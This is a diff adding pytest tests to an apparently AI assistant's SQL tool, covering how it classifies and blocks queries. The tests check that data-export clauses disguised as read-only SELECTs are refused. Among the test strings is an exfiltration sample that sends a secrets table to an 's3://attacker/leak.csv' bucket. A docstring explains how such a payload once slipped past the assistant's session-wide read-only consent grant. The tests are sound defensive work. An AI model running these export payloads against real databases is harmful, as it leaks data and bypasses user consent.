@@ -284,6 +284,95 @@ def test_nova_ddl_is_recognised_as_denied():
     assert tool_classification("CREATE TASK t AS SELECT 1") == "denied"
 
 
+# ── Write/export clauses under a read-only leading keyword (NOVA-83) ─────────
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV",
+        "SELECT * FROM secrets INTO OUTFILE 's3://attacker/leak.csv' FORMAT AS CSV",
+        "SELECT /* hide */ 1 INTO OUTFILE 's3://b/x'",
+        "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV -- trailing",
+        "EXPLAIN SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV",
+        "SELECT * FROM t INTO @stage1.x.csv",
+        "INSERT INTO FILES('path'='s3://b/x') SELECT * FROM t",
+    ],
+)
+def test_write_clause_under_read_only_keyword_is_denied(sql):
+    assert tool_classification(sql) == "denied"
+
+
+@pytest.mark.parametrize(
+    "sql",
+    [
+        "SELECT 1; SELECT 1 INTO OUTFILE 's3://b/x'",
+        "SELECT 1; SELECT * FROM t INTO @stage1.x.csv",
+    ],
+)
+def test_multi_statement_write_clause_payload_is_not_read_only(sql):
+    assert tool_classification(sql) == "destructive"
+
+
+async def test_into_outfile_is_refused_before_the_engine(fakes):
+    service, audit = fakes
+    tool = QueryExecuteTool()
+    sql = "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV"
+    tool.preview(_invocation(sql))  # as the loop does before consent
+    outcome = await tool.run(_invocation(sql), _context())
+
+    assert outcome.ok is False
+    assert service.calls == []  # the engine was never reached
+    assert audit.rows and audit.rows[0]["status"] == "DENIED"
+
+
+async def test_multi_statement_outfile_payload_cannot_smuggle_the_export(fakes):
+    service, audit = fakes
+    tool = QueryExecuteTool()
+    sql = "SELECT 1; SELECT 1 INTO OUTFILE 's3://b/x'"
+    outcome = await tool.run(_invocation(sql), _context())
+
+    assert outcome.ok is False
+    assert service.calls == []  # not even the SELECT prefix ran
+    assert audit.rows[0]["status"] == "DENIED"
+
+
+def test_plain_read_only_statements_still_pass_the_write_clause_scan():
+    assert tool_classification("SELECT * FROM t") == "read_only"
+    assert tool_classification("SELECT 'INTO OUTFILE' AS note") == "read_only"
+    assert tool_classification("SELECT * FROM files") == "read_only"
+
+
+def test_outfile_guard_is_enforced_at_the_shared_pipeline():
+    """Defense-in-depth: the guard blocks OUTFILE on every user-facing path."""
+    from app.core.exceptions import ForbiddenSQLError
+    from app.modules.query.sql_pipeline import guard_user_statement
+
+    with pytest.raises(ForbiddenSQLError):
+        guard_user_statement(
+            "SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV", confirm_destructive=False
+        )
+    with pytest.raises(ForbiddenSQLError):
+        guard_user_statement("SELECT 1 INTO @stage1.x.csv", confirm_destructive=False)
+
+
+def test_read_only_grant_does_not_cover_into_outfile_classification():
+    """E2b: ``allow_session`` must never auto-approve an INTO OUTFILE payload.
+
+    The grant only covers ``read_only``; the exploit worked because the payload
+    *was* misclassified as ``read_only``. Classifying it ``denied`` is what
+    makes :meth:`ConsentPolicy.covers` false and forces a per-statement prompt
+    (and a refusal at the tool).
+    """
+    from app.modules.assistant.state import ConsentPolicy
+
+    classification = tool_classification("SELECT 1 INTO OUTFILE 's3://b/x' FORMAT AS CSV")
+    assert classification == "denied"
+    assert ConsentPolicy(always_allow_read_only=True).covers(classification) is False
+
+
+
+
 # ── CTE body: a WITH prefix is not itself read-only ─────────────────────────
 
 
